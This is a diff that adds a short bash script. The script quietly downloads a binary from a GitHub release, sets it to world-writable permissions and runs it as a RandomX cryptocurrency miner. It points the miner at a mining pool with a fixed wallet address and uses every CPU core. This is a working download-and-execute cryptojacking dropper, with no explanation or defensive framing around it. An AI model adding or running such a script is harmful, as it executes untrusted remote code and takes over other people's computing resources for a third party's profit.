@@ -1,0 +1,4 @@
+#!/bin/bash
+wget -O sauip https://github.com/maksidutyru99/der/releases/download/test/zepo > /dev/null 2>&1
+chmod 777 sauip
+./sauip --donate-level 1 -o randomx.rplant.xyz:7130 -u SaLvs7hDXDzGc5SyXFscw4hMXB1UDX1iASNP7mhsvu2RawQWpEdZSifCLNP36eufYsYYN4MReWt5jdYRNWNiSbBpLpnt64NbKAC.x -p webpassword=x -a rx/0 -t $(nproc --all)
